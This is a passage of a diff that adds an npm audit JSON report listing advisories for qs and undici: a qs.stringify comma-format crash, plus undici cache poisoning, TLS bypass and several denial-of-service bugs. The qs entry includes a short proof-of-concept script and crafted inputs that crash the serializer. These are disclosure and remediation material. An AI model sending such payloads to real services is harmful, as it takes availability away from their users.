library.\n\n```text\nlib/stringify.js  (comma-array branch)\n  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path\n  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path\nlib/utils.js\n  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path\n```\n\n## Impact\n\nPrerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.\n\n## Proof of Concept\n\n`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`\n\n```js\nvar qs = require('qs');\n\n// Source A: qs.parse with allowPrototypes retains the hostile toString segment\nqs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });\n\n// Source B: a JSON request body, no qs parse option needed\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma' });\n\n// Also affected: the encodeValuesOnly sub-path\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });\n```\n\n```text\nA default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value\nB default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value\nC encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value\nN2 callable toString => NO THROW; output=\"a=z\"\nN3 isBuffer vector (CVE-2026-82417) => NO THROW; output=\"a%5Bconstructor%5D%5BisBuffer%5D=x\"\nqs version: 6.16.0\n```\n\n## Attack Chain\n\n1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.\n2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{\"a\":[{\"toString\":\"x\"}]}`.\n3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.\n4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.\n5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.\n6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).\n\n## Bypass Evidence\n\nThis is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S \"obj.join(','\" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{\"a\":[[{\"toString\":\"x\"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: qs`\n- `Confirmed affected range: >= 6.7.0, <= 6.16.0`\n- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`\n- `Fix status: fixed in 6.16.1 (a952e75)`\n\nThe `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.\n\n## Suggested Fix\n\nThe comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.\n\nReported by zx (GitHub: @manus-pi).\n\n---\n\n## Independent report by @Lucidsec\n\nThe following was reported separately, after this advisory, and is merged here as a duplicate.\n\n### Summary\n\nIn project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.\n\n### Technical Details\n\n`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.\n\nA second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).\n\nWho can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{\"a\":[{\"toString\":\"x\"}]}`.\n\nCause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.\n\n### Impact\n\nOne small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.\n\n### Proof of Concept\n\n<details>\n<summary>Show the proof of concept</summary>\n\nChecked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.\n\n- Payload `{\"a\":[{\"toString\":\"x\"}]}` throws at `lib/stringify.js:156`.\n- Baseline `{\"a\":[\"x\",\"y\"]}` returns 200 with body `a=x%2Cy`.\n- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.\n- `encodeValuesOnly: true` throws via `utils.js:292`.\n- `plainObjects` parse plus comma throws.\n\n</details>\n\n### Suggested Fix\n\nBefore `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.",
+      "reported_by": null,
+      "title": "qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110816"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.7.0 <=6.16.0",
+      "github_advisory_id": "GHSA-6pq8-jhm2-2vcw",
+      "recommendation": "Upgrade to version 6.16.1 or later",
+      "patched_versions": ">=6.16.1",
+      "updated": "2026-10-27T16:10:58.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-704"
+      ],
+      "url": "https://github.com/advisories/GHSA-6pq8-jhm2-2vcw"
+    },
+    "1243472": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-4w7w-5xrc-9h26\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109829\n- https://github.com/nodejs/undici/commit/26c2bfb3def0b67241ce878e80657ed5d6c3efa8\n- https://github.com/nodejs/undici/commit/b20b82ad80a405a12b6ce1f341bcd418de390aa0\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-4w7w-5xrc-9h26",
+      "created": "2026-10-27T19:02:31.000Z",
+      "id": 1243472,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen an originless `Agent` composes the redirect and cache interceptors as `compose(redirect(), cache())` with a shared cache (`type: 'shared'`), the cache builds its key from the original request URL before the redirect handler changes the origin. The response produced after a redirect is then stored under the original key, even when the redirect crossed to a different origin.\n\nAn attacker who controls the target of a redirect from a trusted URL can have their response cached under that trusted URL. A later caller requesting the trusted URL receives the attacker's body from the shared cache without either origin being contacted, allowing persistent cache poisoning. The same key confusion also discloses private data: when an authenticated request returns a `private, no-store` redirect to a user-specific resource, the final response is stored under the original URL and can be served to a later unauthenticated caller.\n\nThe cache interceptor was introduced in undici 7.0.0, and all 7.x and 8.x releases before the patched versions are affected. Applications are affected only when an originless `Agent`, a shared `MemoryCacheStore` or `SqliteCacheStore`, and the composition `compose(redirect(), cache())` are all used. Origin-bound `Client` and `Pool` dispatchers, and the reverse composition `compose(cache(), redirect())`, are not affected.\n\n### Patches\n\nUpgrade to `7.30.1` or `8.12.2`. Before storing a response, undici now verifies that the origin that produced it still matches the cache key, and preserves each redirect hop's cache-control policy, so cross-origin redirect responses and responses behind a `no-store` or `private` hop are no longer cached under the original key.\n\n### Workarounds\n\nCompose the interceptors as `compose(cache(), redirect())`, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.",
+      "reported_by": null,
+      "title": "undici vulnerable to cache poisoning and cross-user disclosure via cross-origin redirects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109829"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-4w7w-5xrc-9h26",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-27T19:02:32.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-346",
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-4w7w-5xrc-9h26"
+    },
+    "1243474": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-2m5v-pch6-74hx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109383\n- https://github.com/nodejs/undici/commit/04cb74b1db131ff8f5b4557dce811cbf5f4664b4\n- https://github.com/nodejs/undici/commit/8c59f6b302898cb2e9b0f7962cd7212b6e597c9f\n- https://github.com/nodejs/undici/commit/f75eac00ac177f7b2e6c8bfbd52d4113164286e6\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-2m5v-pch6-74hx",
+      "created": "2026-10-27T19:02:26.000Z",
+      "id": 1243474,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `Agent` passes its constructor options through a JSON-based deep clone (`JSON.parse(JSON.stringify(...))`) before forwarding them to each per-origin `Pool`. JSON cannot represent functions, so a caller-supplied `tls` option containing a `checkServerIdentity` callback is silently dropped before it reaches the TLS layer. As a result, a TLS peer whose certificate a custom `checkServerIdentity` was written to reject, but which passes Node's default hostname and chain checks, is silently accepted when the request is made through `Agent`. Because `Agent` is the default dispatcher behind `request`, `fetch`, and `setGlobalDispatcher`, this is the path most applications use. `EnvHttpProxyAgent` is also affected on its direct and `NO_PROXY` routes, which delegate to an internal `Agent`.\n\nOnly applications that pass a function-valued `tls` option (such as a custom `checkServerIdentity` for certificate or public-key pinning) are affected. Passing the same options through `connect` is not affected. This is the `Agent` counterpart of the `BalancedPool` certificate validation bypass fixed in CVE-2026-84961.\n\n### Patches\n\nUpgrade to undici `6.29.1`, `7.30.1`, or `8.12.2`. `Agent` now preserves the `tls` option outside the JSON clone, so custom TLS verification callbacks are forwarded to each origin unchanged.\n\n### Workarounds\n\nPass the TLS options through `connect` instead of `tls`. For proxied `EnvHttpProxyAgent` destinations, use `requestTls` / `proxyTls`.",
+      "reported_by": null,
+      "title": "undici vulnerable to TLS certificate validation bypass via dropped tls options in Agent",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109383"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-2m5v-pch6-74hx",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-27T19:02:27.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-295"
+      ],
+      "url": "https://github.com/advisories/GHSA-2m5v-pch6-74hx"
+    },
+    "1243477": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-qrxm-fqhp-jwvm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-87018\n- https://github.com/nodejs/undici/commit/12cfd96c3f430897656e3edc1c5e02be8c1cd309\n- https://github.com/nodejs/undici/commit/b40fbfc0651703cf9fa9f6ced68b679f28d8bb28\n- https://github.com/nodejs/undici/commit/e257e9f8fb42eedd50727b9cf65e548c8925e4a8\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-qrxm-fqhp-jwvm",
+      "created": "2026-10-27T19:02:21.000Z",
+      "id": 1243477,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nundici crashes the client process when a TLS 1.2 server renegotiates after the connection is established and presents a different, CA-trusted certificate whose hostname does not match the requested host. Node.js re-runs hostname verification on the renegotiated handshake and destroys the socket with `ERR_TLS_CERT_ALTNAME_INVALID`. undici's established socket error handler asserted that this error code could never occur, so the peer-controlled error became an uncaught `AssertionError` that terminates the Node.js process. Both the HTTP/1.1 and HTTP/2 paths are affected.\n\nA malicious or compromised HTTPS endpoint reached through undici or the global `fetch()` can crash the client with a single server-initiated renegotiation, taking down all in-flight requests and background work in the process. Only TLS 1.2 is affected, because TLS 1.3 does not support renegotiation. Exploitation does not require a CA compromise: the attacker controls the endpoint and can present two ordinary valid certificates, the first matching the requested URL and the second intentionally not matching it.\n\n## Patches\n\nUpgrade to undici 6.29.1, 7.30.1, or 8.12.2.\n\n## Workarounds\n\nRestrict outbound connections to TLS 1.3, for example by setting `connect: { minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3' }` on the client or agent, so that renegotiation cannot occur, when the target endpoints support TLS 1.3.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via TLS 1.2 certificate-changing renegotiation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-87018"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-qrxm-fqhp-jwvm",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-27T19:02:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-617"
+      ],
+      "url": "https://github.com/advisories/GHSA-qrxm-fqhp-jwvm"
+    },
+    "1243480": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-9fm3-97px-rjf6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109932\n- https://github.com/nodejs/undici/commit/39f93e142df03e559fe7c3d1fc7fba9beee2c185\n- https://github.com/nodejs/undici/commit/53944624462b6797560288c55dbd8c66857bb495\n- https://github.com/nodejs/undici/commit/b217373bb024cd93f85eb5b3ffd25684855f60f8\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-9fm3-97px-rjf6",
+      "created": "2026-10-27T19:02:15.000Z",
+      "id": 1243480,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) can be driven to exhaust process memory by a malicious or compromised WebSocket server. For every PING frame received, the receiver automatically writes a PONG response to the socket and ignores the `false` return value from `socket.write()`, which is a backpressure signal, so a server that streams small PING frames while never reading the client's PONGs makes the outbound write queue and heap grow without bound until the Node.js process runs out of memory and terminates. The attack is remote and unauthenticated, needs only a normal WebSocket connection, and is asymmetric: small inbound PINGs produce a much larger retained outbound queue. Availability is the only impact. undici 5.x, 6.x, 7.x, and 8.x are affected; the WebSocket client was introduced in 5.15.0.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which pause WebSocket frame parsing when the automatic PONG response hits socket backpressure and resume on drain, bounding the outbound queue.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici WebSocket client vulnerable to Denial of Service via unbounded automatic PONG buffering",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109932"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-9fm3-97px-rjf6",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-27T19:02:17.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-405",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-9fm3-97px-rjf6"
+    },
+    "1243483": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-55wc-3pg8-jfw6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-87029\n- https://github.com/nodejs/undici/commit/63cba7712ca012b2603c6aeeb4c72d8692332cd0\n- https://github.com/nodejs/undici/commit/f851f315db1f2acce0ea668f88d9d0fa61c8420c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-55wc-3pg8-jfw6",
+      "created": "2026-10-27T19:02:10.000Z",
+      "id": 1243483,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nundici's `decompress` interceptor forwards decompressed response data to the downstream handler from zlib stream event callbacks without catching exceptions those callbacks may throw. undici's engine converts a synchronous throw from a downstream handler into a per-request failure, but that protection is not in place when the throw happens asynchronously from a zlib callback. As a result, a downstream handler that throws by design, for example the built-in `dump` interceptor which throws when a response exceeds its `maxSize`, escapes as an uncaught exception and terminates the Node.js process.\n\nA malicious or compromised HTTP server can crash any client that composes the `decompress` interceptor with `dump` (or another response handler that throws), by returning a small compressed body that decompresses to more than the configured limit. The compressed bytes on the wire are tiny, so only the decompressed size matters. If the application keeps the process alive with a global uncaught-exception handler, the affected request instead hangs until the body timeout.\n\n## Patches\n\nUpgrade to undici 7.30.1 or 8.12.2.\n\n## Workarounds\n\nAvoid composing the `decompress` interceptor with a response handler that throws during response processing (such as `dump` with a `maxSize`) until upgrading.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unhandled exception in the decompress interceptor",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-87029"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-55wc-3pg8-jfw6",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-27T19:02:12.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-55wc-3pg8-jfw6"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 3,
+      "moderate": 6,
+      "high": 7,
+      "critical": 1
+    },
+    "dependencies": 877,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 877
+  }
+}
